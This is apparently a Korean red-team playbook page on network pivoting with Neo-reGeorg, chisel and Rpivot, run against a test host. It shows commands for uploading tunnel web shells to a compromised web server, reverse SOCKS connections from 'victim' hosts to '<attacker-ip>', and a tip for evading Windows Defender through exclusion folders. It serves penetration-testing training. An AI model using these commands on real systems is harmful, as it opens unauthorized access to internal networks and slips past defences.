---
description: Pivoting에 자주 쓰이는 도구 간단 정리
---

# 네트워크 피버팅 - 툴

***

## Network Pivoting - Tools

### Neo-reGeorg

https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md

만약 탈취한 원격 명령 실행이 가능한 서버가 웹 서버라면 SSH 접속 정보가 없는 환경에서도 강제로 SOCK5 통신을 생성이 가능하다. Neo-reGeorg 도구는 jsp, asp, php, go를 지원한다.

가장 범용적으로 사용되는 jsp, php asp에 대한 사용법을 알아보자.

먼저 SOCK5 통신 오픈에 사용할 코드를 생성한다.

```bash
$ python neoreg.py generate -k password

    [+] Create neoreg server files:
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.php
```

#### JSP

생성된 jsp 코드를 테스트용 웹 서버에 업로드한다.

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/neo-001.png)

이후 neoreg.py를 통해 SOCK5 통신을 열면 127.0.0.1:1080이 활성화되는 것을 확인할 수 있다.

```bash
# attacker
$ python3 neoreg.py -k password -u http://pentest.yoobi.kr:10501/tunnel2/tunnel.jsp
```

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/neo-002.png)

활성된 SOCK5 포트를 사용한 proxychains을 통해 내부망 접근이 가능하다.

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/neo-003.png)

#### PHP

동일하게 테스트용 웹 서버에 tunnel.php 파일을 업로드한다.

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/neo-004.png)

이후 neoreg.py를 통해 SOCK5 통신을 열면 127.0.0.1:1080이 활성화되는 것을 확인할 수 있다.

```bash
# attacker
$ python3 neoreg.py -k password -u http://pentest.yoobi.kr:10501/tunnel.php
```

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/neo-005.png)

활성된 SOCK5 포트를 사용한 proxychains을 통해 내부망 접근이 가능하다.

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/neo-006.png)

#### ASP

동일하게 테스트용 웹 서버에 tunnel.asp 파일을 업로드한다.

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/neo-007.png)

이후 neoreg.py를 통해 SOCK5 통신을 열면 127.0.0.1:1080이 활성화되는 것을 확인할 수 있다.

```bash
python3 neoreg.py -k password -u http://pentest.yoobi.kr:10502/tunnel.aspx
```

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/neo-008.png)

활성된 SOCK5 포트를 사용한 proxychains을 통해 내부망 접근이 가능하다.

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/neo-009.png)

이 처럼 Neo-reGeorg 도구를 활용하여 SSH 서비스에 대한 접속 정보가 없더라도 강제로 SOCK5 통신을 생성하여 proxychain 사용이 가능하다.

### chisel

https://github.com/jpillora/chisel

만약 탈취한 원격 명령 실행이 가능한 서버가 웹 서버가 아니더라도 chisel을 사용하여 강제로 sock5 포트를 열어서 proxychains을 사용할 수 있다. 해당 도구는 바이너리 형태로 제공되며 리눅스, 윈도우 모두 지원하기에 활용도가 매우 높다.

```bash
# attacker
$ chisel server -p 10505 --reverse
```

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/chisel-001.png)

#### Linux

```powershell
# victim
$ ./chisel_1.9.1_linux_amd64 client <attacker-ip>:10505 R:socks
```

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/chisel-002.png)

### Window

```powershell
# victim
> .\chisel.exe client <attacker-ip>:10505 R:socks
```

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/chisel-003.png)

단, 대부분 윈도우 서버는 윈도우 디펜더에서 chisel.exe를 악성코드로 탐지하고 있다. 탈취한 윈도우 서버의 권한이 높을 경우(Administrator, SYSTEM) 제외 폴더 지정을 통해 우회할 수 있다.

다음과 같이 연결 시, 127.0.0.1:1080 SOCK5 통신이 활성화되는 것을 확인할 수 있다.

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/chisel-004.png)

활성된 SOCK5 포트를 사용한 proxychains을 통해 내부망 접근이 가능하다.

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/chisel-005.png)

이 처럼 chicel 도구를 활용하여 SSH 서비스에 대한 접속 정보가 없고 탈취한 서버가 웹서버가 아니더라도 강제로 SOCK5 통신을 생성하여 proxychain 사용이 가능하다.

### Rpivot

https://github.com/klsecservices/rpivot

Rpivot 도구는 chisel과 유사하지만 바이너리 형태가 아닌 python 2 소스코드 형태의 도구이며 sock4 통신을 열 수 있다. 해당 도구를 사용하여 강제로 sock4 포트를 열어서 proxychains을 사용할 수 있다.

sock4 이므로 /etc/proxychains.conf 를 sock4로 수정 적용하여야 한다.

```powershell
$ cat /etc/proxychains.conf

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 1080
#socks5 127.0.0.1 1080
```

```powershell
# attacker
$ python2 server.py --server-port 10505 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/rpivot-001.png)

#### Linux

```powershell
# victim no need root
$ python client.py --server-ip <attacker-ip> --server-port 10505
```

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/rpivot-002.png)

#### Window

```powershell
# vicitm no need administrator
> C:\Python27\python.exe .\client.py --server-ip <attacker-ip> --server-port 10505
```

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/rpivot-003.png)

다음과 같이 연결 시, 127.0.0.1:1080 SOCK5 통신이 활성화되는 것을 확인할 수 있다.

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/rpivot-004.png)

활성된 SOCK4 포트를 사용한 proxychains을 통해 내부망 접근이 가능하다.

![Untitled](https://raw.githubusercontent.com/ChoiSG/kr-redteam-playbook/main/obsidian\_resources/rpivot-005.png)

해당 도구는 바이너리 형태가 아니기 때문에 python 2가 필요합니다. 대상 서버에 임의 설치가 불가한 상황이라면 python2 포터블을 활용할 수 있다.

for window

https://github.com/sganis/pyportable/releases/download/v2.7.10rc1/pyportable-2.7.10rc1.zip

이 처럼 rpivot 도구를 활용하여 SSH 서비스에 대한 접속 정보가 없고 탈취한 서버가 웹서버가 아니더라도 강제로 SOCK4 통신을 생성하여 proxychain 사용이 가능하다.

따라서, 주어진 환경에 맞춰 chisel과 rpivot 중 유동적으로 사용하자.
